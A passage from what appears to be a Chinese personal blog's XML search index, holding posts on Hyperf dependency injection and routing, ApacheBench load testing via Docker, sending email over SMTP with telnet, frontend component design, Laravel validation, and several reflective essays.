</code></pre><p>}<br>class Dependence{<br>    &lt;<config>&gt;<br>    // 类型提示对应要注入的类<br>    …<br>    ‘App\UserInterface’ =&gt; ‘App\User’<br>    …<br>}<br>class UserInfo{<br>    &lt;<class>&gt;<br>}<br>class User{<br>    &lt;<class>&gt;</class></class></config></p>
<pre><code>- $userInfo: Object 
+ __construct(App\UserInterface::class $userInfo) : void
</code></pre><p>}<br>容器 –&gt; 实例: 5返回实例<br>实例 –&gt; 容器:1<br>容器 <-- 2 user : user类载入容器 dependence --|> 容器 : 3 查看UserInterface对应的注入类<br>容器 &lt;|– UserInfo : 4 根据依赖关系注入<br></--></p></div><br><img src="/images/202002051532.PNG" alt><br><a id="more"></a><br>官方的<code>Di</code>解释是:即“依赖注入”：组件之间依赖关系由容器在运行期决定,由容器动态的将来依赖关系注入到对象之中。<br>&emsp;由于实例都是统一从容器中获取，使得只要修改类型提示关联的类就能全局生效，或者类的单例使用。<p></p>
<h3 id="2-在hyperf的依赖注入实现"><a href="#2-在hyperf的依赖注入实现" class="headerlink" title="2 在hyperf的依赖注入实现"></a>2 在hyperf的依赖注入实现</h3><p>&emsp;在<code>hyperf</code>的容器中，通过扫描文件中类的类型提示的接口类对应的实现类，从而把依赖的实现类实例注入到实例中。所以标明一个对象所依赖的有哪个对象是通过传入的参数的类型提示来标明的。注入的方式分为构造方法注入和@inject注解注入。</p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>依赖注入</tag>
        <tag>hyperf</tag>
      </tags>
  </entry>
  <entry>
    <title>【php】hyperf笔记-路由注解</title>
    <url>/2020/02/03/%E3%80%90php%E3%80%91hyperf%E7%AC%94%E8%AE%B0-%E8%B7%AF%E7%94%B1%E6%B3%A8%E8%A7%A3/</url>
    <content><![CDATA[<h3 id="1-什么是路由注解"><a href="#1-什么是路由注解" class="headerlink" title="1 什么是路由注解?"></a>1 什么是路由注解?</h3><p>&emsp;路由注解是写在类或方法上的，用于的绑定方法和UR并配置请求方式。</p>
<h3 id="2-路由前缀"><a href="#2-路由前缀" class="headerlink" title="2 路由前缀"></a>2 路由前缀</h3><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="keyword">use</span> <span class="title">Hyperf</span>\<span class="title">HttpServer</span>\<span class="title">Annotation</span>\<span class="title">AutoController</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@AutoController</span>(prefix="/users")</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">AbstractController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $user = <span class="keyword">$this</span>-&gt;request-&gt;input(<span class="string">'user'</span>, <span class="string">'Hyperf'</span>);</span><br><span class="line">        $method = <span class="keyword">$this</span>-&gt;request-&gt;getMethod();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">'method'</span> =&gt; $method,</span><br><span class="line">            <span class="string">'message'</span> =&gt; <span class="string">"Hello &#123;$user&#125;."</span>,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<p>&emsp;<code>GET</code>请求<code>index</code>方法的链接为<code>/users</code>。</p>
<blockquote>
<p>路由如果要使用注解的方式，在不配置前缀的前提下， 则心命名空间加类名为<code>URI</code>前缀.<br><a id="more"></a></p>
</blockquote>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>hyperf</tag>
        <tag>路由注解</tag>
      </tags>
  </entry>
  <entry>
    <title>【心情文章】三观粗见-人的出路在哪里?</title>
    <url>/2020/02/03/%E3%80%90%E5%BF%83%E6%83%85%E6%96%87%E7%AB%A0%E3%80%91%E4%B8%89%E8%A7%82%E7%B2%97%E8%A7%81/</url>
    <content><![CDATA[<p>&emsp;人来到这世上就是为了活着，而物质的总量不变！基于这个现状，人就会一直自相残杀下去，没有退路。<br>&emsp; 物质的总量是不变的，资源的是有限的，十个人的口粮，给十一个人至少得死一个，剩下来的继续活。这就是世界这就是天理，天理只有8个字：物竞天择，适者生存。<br><a id="more"></a><br>&emsp; 我不想死，我生来就是为了在这个世界活下去。粮食不够吃，那么去种，所以农民或许能活下去;要么去剥削农民，所以地主一定能活到最后的。所以人的一生只做2件事:生产和剥削。哪怕所有人都知道所有人都当农民都能活下去，而全当地主最后都得死时，还是所有的人都想当地主，因为”人来到这世上就是为了活着”–地主更能活到最后，不好吗?。这就是矛盾的源点：为了活着就种粮食，为了更好活着，就去抢粮食！–这就是人生。<br>&emsp; 凡是有利于生存的物质就是价值。<br>&emsp; 人来到这世上就是为了活着，而物质的总量不变！基于这个现状，人就会一直自相残杀下去，没有退路。说人话就是只要人是依赖于粮食生存的，粮食再怎么种都是有限的，人人都有这个意识，有粮食活得长，没粮食就等死，除非有无限的粮食，不然窝里斗是不会结束的，阶级会一直在，这才是现实。</p>
]]></content>
      <categories>
        <category>心情文章</category>
      </categories>
      <tags>
        <tag>心情文章</tag>
      </tags>
  </entry>
  <entry>
    <title>【测试】玩ad贼6的那个仔有话说</title>
    <url>/2020/02/02/%E3%80%90%E6%B5%8B%E8%AF%95%E3%80%91%E7%8E%A9ad%E8%B4%BC6%E7%9A%84%E9%82%A3%E4%B8%AA%E4%BB%94%E6%9C%89%E8%AF%9D%E8%AF%B4/</url>
    <content><![CDATA[<div class="note info">
            <p><code>ad</code>测试工具基于<code>docker</code>。安装官方说明文档在这: <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZ2V0LWRvY2tlci8=" title="https://docs.docker.com/get-docker/">I`m here!<i class="fa fa-external-link"></i></span></p>
          </div>
<h3 id="1-使用前的镜像中ad工具的别名配置"><a href="#1-使用前的镜像中ad工具的别名配置" class="headerlink" title="1. 使用前的镜像中ad工具的别名配置"></a>1. 使用前的镜像中ad工具的别名配置</h3><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$ docker run  --rm httpd:2.4.41-alpine  ab -k -c 100 -n 10000 http://jd.wuchuheng.com:9501/</span><br><span class="line">This is ApacheBench, Version 2.3 &lt;<span class="variable">$Revision</span>: 1843412 $&gt;</span><br><span class="line">Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/</span><br><span class="line">Licensed to The Apache Software Foundation, http://www.apache.org/</span><br><span class="line"></span><br><span class="line">Benchmarking jd.wuchuheng.com (be patient)</span><br><span class="line">Completed 1000 requests</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<a id="more"></a>
<p>基本上一条命令就搞定了， 格式为 <code>docker run  --rm httpd:2.4.41-alpine  ab &lt;option&gt; ...</code> 意思是在<code>apache</code>镜像中运行下<code>ad</code>工具后就删除掉容器。由于命令过长可以把开头固定参数进行别名设置：</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"alias ab='docker run  --rm httpd:2.4.41-alpine  ab'"</span> &gt;&gt; ~/.bashrc; <span class="comment"># 定义简化的别名并写入用户的bash配置文件</span></span><br><span class="line">$ <span class="built_in">source</span> ~/.bashrc; <span class="comment"># 重载bash配置文件使别名生效</span></span><br><span class="line">$ ab -k -c 100 -n 10000 http://jd.wuchuheng.com:9501/</span><br><span class="line">This is ApacheBench, Version 2.3 &lt;<span class="variable">$Revision</span>: 1843412 $&gt;</span><br><span class="line">Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/</span><br><span class="line">Licensed to The Apache Software Foundation, http://www.apache.org/</span><br><span class="line"></span><br><span class="line">Benchmarking jd.wuchuheng.com (be patient)</span><br><span class="line">Completed 1000 requests</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<h4 id="1-1-小结"><a href="#1-1-小结" class="headerlink" title="1.1 小结"></a>1.1 小结</h4><p>&emsp;为什么我要通过<code>docker</code>再去运行<code>apache</code>镜像再在里面运行<code>ab</code>工具这么麻烦？为什么就不能一开始就直接安装<code>apache</code>直在机器运行呢?<br>&emsp; 在<code>linux</code>中不同的发行版本之间的软件安装是不一样的，或编译或源或卸载，总会因为奇奇怪怪的问题而浪费时间。大家想象一下，有没有这样的一个场景，我要什么软件招之即来、我不要什么软件都是挥之即去.<code>docker</code> 可以实现这样的场景，上面我已经配置好了<code>db</code>工具了写在了<code>~/.bashrc</code>中，我到任何的<code>linux</code>主机中，只要安装好<code>docker</code>,然后把我写有大量的工具的配置别名文件<code>.bashrc</code>加载进去，那么就可以直接使用这些工具。没有安装和卸载的概念，所有的工具都是之前已经配置好的放镜像中只要下载下来就可以直接使用也可以直接删除。所以我说…<br>&emsp; 所以我说这个场景可以实现，首先创建<code>.dotfiles</code> 项目用于存放各种配置各种工具，再写个导入配置的<code>sh</code> 脚本，最后放到代码项目库中，到任何的<code>linux</code>主机是把docker安装下（如果说能把导入脚本强大些就干脆把安装<code>docker</code> 写在当也行）并把设置当前用户可执行<code>docker</code>，把<code>dotfiles</code> 项目拉下来，导入所有的配置就行了。可以参考我个人的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3d1Y2h1aGVuZ3Rvb2xzL2RvdGZpbGVz" title="https://github.com/wuchuhengtools/dotfiles"><code>dotfiles</code><i class="fa fa-external-link"></i></span><br>&emsp; 结论是： 拥有<code>docker</code> 也许可以拥有世界。</p>
<h3 id="2-100并发10000-请求"><a href="#2-100并发10000-请求" class="headerlink" title="2 100并发10000 请求"></a>2 100并发10000 请求</h3><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$ ab -k -c 100 -n 10000 http://jd.wuchuheng.com:9501/</span><br><span class="line">This is ApacheBench, Version 2.3 &lt;<span class="variable">$Revision</span>: 1843412 $&gt;</span><br><span class="line">Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/</span><br><span class="line">Licensed to The Apache Software Foundation, http://www.apache.org/</span><br><span class="line"></span><br><span class="line">Benchmarking jd.wuchuheng.com (be patient)</span><br><span class="line">Completed 1000 requests</span><br><span class="line">Completed 2000 requests</span><br><span class="line">Completed 3000 requests</span><br><span class="line">Completed 4000 requests</span><br><span class="line">Completed 5000 requests</span><br><span class="line">Completed 6000 requests</span><br><span class="line">Completed 7000 requests</span><br><span class="line">Completed 8000 requests</span><br><span class="line">Completed 9000 requests</span><br><span class="line">Completed 10000 requests</span><br><span class="line">Finished 10000 requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server Software:        Hyperf</span><br><span class="line">Server Hostname:        jd.wuchuheng.com</span><br><span class="line">Server Port:            9501</span><br><span class="line"></span><br><span class="line">Document Path:          /</span><br><span class="line">Document Length:        42 bytes</span><br><span class="line"></span><br><span class="line">Concurrency Level:      100 <span class="comment">#当前并发量</span></span><br><span class="line">Time taken <span class="keyword">for</span> tests:   4.980 seconds <span class="comment"># 本次100并发症10000次请求完成的时间</span></span><br><span class="line">Complete requests:      10000  <span class="comment"># 本次测试成功的请求量</span></span><br><span class="line">Failed requests:        0    <span class="comment"># 失败的请求量</span></span><br><span class="line">Keep-Alive requests:    10000</span><br><span class="line">Total transferred:      1900000 bytes</span><br><span class="line">HTML transferred:       420000 bytes</span><br><span class="line">Requests per second:    2007.87 [<span class="comment">#/sec] (mean) # 1秒内完成的请求，数字越好</span></span><br><span class="line">Time per request:       49.804 [ms] (mean) <span class="comment"># 完成一次并发（100次）花费时间</span></span><br><span class="line">Time per request:       0.498 [ms] (mean, across all concurrent requests) <span class="comment"># 平均每次请求花费时间</span></span><br><span class="line">Transfer rate:          372.55 [Kbytes/sec] received</span><br><span class="line"></span><br><span class="line">Connection Times (ms)</span><br><span class="line">              min  mean[+/-sd] median   max</span><br><span class="line">Connect:        0    0   0.3      0       4</span><br><span class="line">Processing:     1   49  38.6     78     106</span><br><span class="line">Waiting:        1   49  38.6     78     106</span><br><span class="line">Total:          1   49  38.6     78     106</span><br><span class="line"></span><br><span class="line">Percentage of the requests served within a certain time (ms)</span><br><span class="line">  50%     78</span><br><span class="line">  66%     78</span><br><span class="line">  75%     89</span><br><span class="line">  80%     89</span><br><span class="line">  90%     89</span><br><span class="line">  95%     89</span><br><span class="line">  98%     89</span><br><span class="line">  99%     89</span><br><span class="line"> 100%    106 (longest request)</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>测试</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>ad工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【tcp/ip】e-mail初识学习笔记</title>
    <url>/2020/01/30/e-mail%E5%88%9D%E8%AF%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="1-什么是邮件？"><a href="#1-什么是邮件？" class="headerlink" title="1 什么是邮件？"></a>1 什么是邮件？</h3><p>&emsp;不讨论邮件以外的任何定义，从邮件本身来看只干2件事：收信和发信，细点说是找到自己的邮箱收信和注明别人的信箱地址发信。而电子邮件不过是把现实的地址映射为:<usre>@<domain>的格式，然后照常收发信。所以电子邮件无论多复杂，最终只是要实现“收信”和“发信”</domain></usre></p>
<a id="more"></a>
<h3 id="2-什么是邮件的格式？"><a href="#2-什么是邮件的格式？" class="headerlink" title="2 什么是邮件的格式？"></a>2 什么是邮件的格式？</h3><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">from: &lt;username&gt;@&lt;domain&gt;</span><br><span class="line">to: &lt;username&gt;@&lt;domain&gt;</span><br><span class="line">subject: &lt;the email title&gt;</span><br><span class="line"></span><br><span class="line">&lt;the email content&gt;</span><br><span class="line">.</span><br></pre></td></tr></table></figure></div>
<p>&emsp; 以上是邮件的最终的文本传输形式，分别是发件人地址收件、收件人地址、标题、空行、邮件正文和”.”。其中空行把邮件又划分为邮件头（空行以上）和邮件正文（空行下），又用”.”代表邮件的结束。</p>
<h3 id="3-电子邮件是如何实现收发的？"><a href="#3-电子邮件是如何实现收发的？" class="headerlink" title="3 电子邮件是如何实现收发的？"></a>3 电子邮件是如何实现收发的？</h3><h4 id="3-1-邮件的发送"><a href="#3-1-邮件的发送" class="headerlink" title="3.1 邮件的发送"></a>3.1 邮件的发送</h4><p>&emsp;邮件的发送是由<code>smtp</code>(Simple Mail Transfer Protocol)来传输的，首先邮件服务器会跟邮件客户端建立连接并进行登录验证通过后把邮件发送到服务器上，再读取邮件的头的收件地址的域名后，再根据这个域名通过<code>smtp</code>把邮件发送到这域名的<code>MX</code>解析指向<code>IP</code>主机上，如果没有<code>MX</code>记录则用<code>A</code>记录的指向。</p>
<pre class="mermaid">sequenceDiagram
Title: 邮件的发送时序图
    clientA&#64host1.com客户端 ->> host1.com主机 :sent to :clientB&#64host2.com
    host1.com主机 ->> host2.com主机: 根据邮件地址进行转发对应主机上
    host2.com主机 ->> host1.com主机: 250 OK
    host1.com主机 ->> clientA&#64host1.com客户端: 250 OK
    Note right of host2.com主机: 整个流程的发送协议都是使用smtp并基于公网主机的25端口IO.</pre>

<h4 id="3-2-使用telnet连接smtp服务器发送邮件"><a href="#3-2-使用telnet连接smtp服务器发送邮件" class="headerlink" title="3.2 使用telnet连接smtp服务器发送邮件"></a>3.2 使用<code>telnet</code>连接<code>smtp</code>服务器发送邮件</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$ telnet smtp.163.com 25 <span class="comment"># 连接smtp服务器</span></span><br><span class="line">Trying 220.181.12.16...</span><br><span class="line">Connected to smtp.163.com.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">220 163.com Anti-spam GT <span class="keyword">for</span> Coremail System (163com[20141201])</span><br><span class="line">$ helo fs <span class="comment"># helo 是跟服务器连接后要发送的第一条命令一般格式为 helo &lt;domain&gt;</span></span><br><span class="line">250 OK</span><br><span class="line">$ auth login <span class="comment"># 进入登录</span></span><br><span class="line">334 dXNlcm5hbWU6</span><br><span class="line">$ d3VjaHVoZW5nQDE2My5jb20= <span class="comment"># 用户名bash64</span></span><br><span class="line">334 UGFzc3dvcmQ6</span><br><span class="line">$ b*********lJSUlI5NA== <span class="comment"># 密码base64</span></span><br><span class="line">235 Authentication successful</span><br><span class="line">$ mail from: &lt;wuchuheng@163.com&gt; <span class="comment"># 邮件发送地址</span></span><br><span class="line">250 Mail OK</span><br><span class="line">$ rcpt to: &lt;tnmrlj@163.com&gt; <span class="comment"># 收件地址</span></span><br><span class="line">250 Mail OK</span><br><span class="line">$ rcpt to: &lt;2831473954@qq.com&gt; <span class="comment"># 抄送地址</span></span><br><span class="line">250 Mail OK</span><br><span class="line">$ data <span class="comment"># 进入写邮件内容</span></span><br><span class="line">354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><br><span class="line">$ from: wuchuheng@163.com <span class="comment"># 邮件发送地址</span></span><br><span class="line">$ to: tnmrlj@163.com <span class="comment"># 收件地址</span></span><br><span class="line">$ subject: <span class="built_in">test</span> title <span class="comment"># 邮件标题</span></span><br><span class="line">$ <span class="comment">#空行 进入编辑邮件正文</span></span><br><span class="line">$ the <span class="built_in">test</span> content. <span class="comment"># 邮件正文</span></span><br><span class="line">$ <span class="comment"># 空行+.代表一封邮件的结束并发送</span></span><br><span class="line">$ .</span><br><span class="line">250 Mail OK queued as smtp12,EMCowABXD0kOKjVehG6dAA--.53084S2 1580542691</span><br><span class="line">$ quit <span class="comment"># 退出</span></span><br><span class="line">221 Bye</span><br><span class="line">Connection closed by foreign host.</span><br><span class="line">[root@JD ~]<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
<h3 id="3-3-邮件的接收"><a href="#3-3-邮件的接收" class="headerlink" title="3.3 邮件的接收"></a>3.3 邮件的接收</h3><p>&emsp;邮件的接收是通过<code>IMAP</code>(Internet Mail Access Protocol)<br>或<code>POP3</code>()协议进行接收的。</p>
]]></content>
      <categories>
        <category>tcp/ip</category>
      </categories>
      <tags>
        <tag>tcp/ip</tag>
      </tags>
  </entry>
  <entry>
    <title>【前端】组件设计原则笔记</title>
    <url>/2020/01/23/%E3%80%90%E5%89%8D%E7%AB%AF%E3%80%91%E7%BB%84%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="1-组件的意义？"><a href="#1-组件的意义？" class="headerlink" title="1 组件的意义？"></a>1 组件的意义？</h3><div class="note info">
            <p>或者说组件还来了哪些好处？</p>
          </div>
<pre><code>*  样式隔离和封装    每个组件的样式只能是组件内的样式文件，这样避免全局样式的干扰，而且易于修改。
</code></pre><ul>
<li><code>html</code>的元素封装实现简化 特定的<code>html</code>封装在组件里能再通过易用的方式调用能简化<code>html</code>的文件，大大提高可读性能.</li>
<li><p>业务的代码的封装 提高代码的可维护性<br>总结下来就是封装实现代码的可复用可维护，用程序的封装概念去封装<code>html</code>、<code>css</code>和<code>js</code></p>
<a id="more"></a>
</li>
</ul>
<h3 id="2-组件的灵活性和易用性之间做选择-找到一人平衡点啊"><a href="#2-组件的灵活性和易用性之间做选择-找到一人平衡点啊" class="headerlink" title="2 组件的灵活性和易用性之间做选择,找到一人平衡点啊"></a>2 组件的灵活性和易用性之间做选择,找到一人平衡点啊</h3><p>&emsp;一个组件的灵活性的易用性是相对的。过于灵活往往需要配置过多的属性，稳定性方面也可能会出现bug,相反的，过于易用的话则使用的场景往往会被限制住。如有一个<code>grid</code>组件用于宫格布局用的，如果追求易用性的话，数据的展示和数据的请求都封装进去后，这样的组件是可以直接拿来用的啊，这类的就是易用性强的组件，但由于过度封装导致组件的复用性很差。<br>    &emsp;由于数据的请求也一并封装了， 导致不方便要更换别的数据来渲染，从而难以复用，所以说灵活性很差。而如果数据请求从组件内分离出来的话，让<code>grid</code>组件只负责数据接收并渲染，那么使用的前提是要把数据准备好并传入进去，由于组件只负责数据的渲染大大提高组件的可灵活性(复用性),但相对来说就没有原先什么都封装好的方便了，所以易用和灵活要做个取舍。而一般软件的设计原则之一就是代码复用，所以组件的设计一来说还是要考虑到灵活性的。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>设计原则</tag>
      </tags>
  </entry>
  <entry>
    <title>【心情文章】自我成全</title>
    <url>/2020/01/22/%E3%80%90%E5%BF%83%E6%83%85%E6%96%87%E7%AB%A0%E3%80%91%E8%87%AA%E6%88%91%E6%88%90%E5%85%A8/</url>
    <content><![CDATA[<p>&emsp; 在《霸王别姬》中，戏班子师傅对无力干着急对弟子说:”人得自个成全自个！”。那时懵懵懂懂。只是影片传过来的灰色窒息感让我难受，转头也就忘了。<br>&emsp;后来进入了社会，我所坚信的”平等，自由和友善“，一次又一次一次又一次让我处于劣势，然后一个又一个一遍又一遍被人粉碎给我看，而犯贱的我总在等你过来犯贱给你看，不知道忘了什么时候，心很难再温起来了，话也不知道该怎么说了,伴随那团窒息感总绕来绕去起起伏伏，浑浑噩噩直到记忆传来那个恨入骨髓的声音”人得自个成全自个”时,也许可以有这么条路，我能信我所信，忠于我心也能走的下去,只要自己成全自己，自己去开路，自己去走，人必将信他所信，人忠于已心，活下去。</p>
]]></content>
      <categories>
        <category>心情文章</category>
      </categories>
      <tags>
        <tag>心情文章</tag>
      </tags>
  </entry>
  <entry>
    <title>【vscode】vscode使用笔记</title>
    <url>/2020/01/10/%E3%80%90vscode%E3%80%91vscode%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="配置gitbash"><a href="#配置gitbash" class="headerlink" title="配置gitbash"></a>配置gitbash</h3><div class="note info">
            <p>在<code>windowns</code>下把<code>git bash</code>集成到里去</p>
          </div>
<p> 在点击设置搜索<code>terminal</code>，选中<code>terminal</code>在这相选项中找出<code>edit in setting jeson</code>，点击并修改里的终端配置字段<code>terminal.integrated.shell.window</code>修改为<br> <figure class="highlight"><table><tr><td class="code"><pre><span class="line">"terminal.integrated.shell.windows": "C:\\Program Files (x86)\\Git\\bin\\bash.exe"</span><br></pre></td></tr></table></figure></p>
<p> 意思是把数据输入和输出的交互处理交给<code>git-bash</code>的执行文件来处理</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title>【心情文章】提问的艺术-提问者的二意</title>
    <url>/2019/12/29/%E3%80%90%E5%BF%83%E6%83%85%E6%96%87%E7%AB%A0%E3%80%91%E6%8F%90%E9%97%AE%E7%9A%84%E8%89%BA%E6%9C%AF-%E6%8F%90%E9%97%AE%E8%80%85%E7%9A%84%E4%BA%8C%E6%84%8F/</url>
    <content><![CDATA[<p>&emsp;我曾对生人直问：你爸叫什么名字？那时人家就当没听过，场面尴尬。现在想来这样的直问本身就是错误的。人家本来就跟我不熟。我问那么多想查户口啊？那这样的提问有什么问题呢？我总结了下，一个能被人接受并很可能会得到对方回应的问题，应该表明3个“意”,分别是“来意”，“诚意”和“意思”。<br>  &emsp;一个问题最重要的是表明来意，如果一个问题无法表明提问者的来意是善是恶，那这个问题本身就是错误的，因为它很可能不能从对方得到期待的答案，比如：“你家里都有些什么人啊？”;那对方很可能不会回答这个问题，防人之心的原则来看，对方无法判断你的来意是好是坏，基于防人的原则会当成恶意的提问。所以不会认真回答这个问题，如果这样问“我这里有好多的土特产，你家里都有些什么人啊？我寄些你们家里人尝尝怎样？”？这样的问题表明的来意是送礼，是善意的，应该给人一个礼貌的回复。<br>  <a id="more"></a><br>  &emsp;如果一个问题表明了来意是善意的，那只能说明这个问题很有可能得到回复，而加大对方回复的机率就是问题中要表明一个“诚意”，提问的人要知道对方是没有义务花他的时间来给你解答问题的。如：这个<code>bug</code>的错误信息是。。。，我在<code>google</code>和官方文档都没有找解决的方法，欢迎大家随时指正批评，谢谢！ 首先这是个技术问题，已经跟人关系的善恶观念关系不大，不过这个问题在提问的同时也表明对他人的时间</p>
]]></content>
      <categories>
        <category>心情文章</category>
      </categories>
      <tags>
        <tag>心情文章</tag>
      </tags>
  </entry>
  <entry>
    <title>【php】laravel学习笔记-表单验证</title>
    <url>/2019/12/13/%E3%80%90php%E3%80%91laravel%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-restfull%E9%93%BE%E6%8E%A5%E5%8F%82%E6%95%B0%E9%AA%8C%E8%AF%81/</url>
    <content><![CDATA[<h3 id="1-laravel-restfull链接参数验证"><a href="#1-laravel-restfull链接参数验证" class="headerlink" title="1 laravel restfull链接参数验证"></a>1 laravel restfull链接参数验证</h3><h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><div class="note info">
            <p>链接的参数默认是不能参与请求类的验证的，但<code>restfull</code>风格的参数基本集成在链接上，这时是需要验证的</p>
          </div>
<h4 id="环境参数"><a href="#环境参数" class="headerlink" title="环境参数"></a>环境参数</h4><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>laravel 5.8</td>
<td>这个就不说明了</td>
</tr>
</tbody>
</table>
<a id="more"></a>
<h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p> 生成请求文件, 命令行输入 <code>php artisan make:request GenerateCreditPreOrder</code> :</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Requests</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Http</span>\<span class="title">FormRequest</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenerateCreditPreOrder</span> <span class="keyword">extends</span> <span class="title">FormRequest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">validationData</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> array_merge(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;route()-&gt;parameters(),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;input()</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Determine if the user is authorized to make this request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">authorize</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the validation rules that apply to the request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rules</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line"></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后在类文件中加入<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">validationData</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;route()-&gt;parameters();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>方法来重写<code>validationData</code> </p>
<ul>
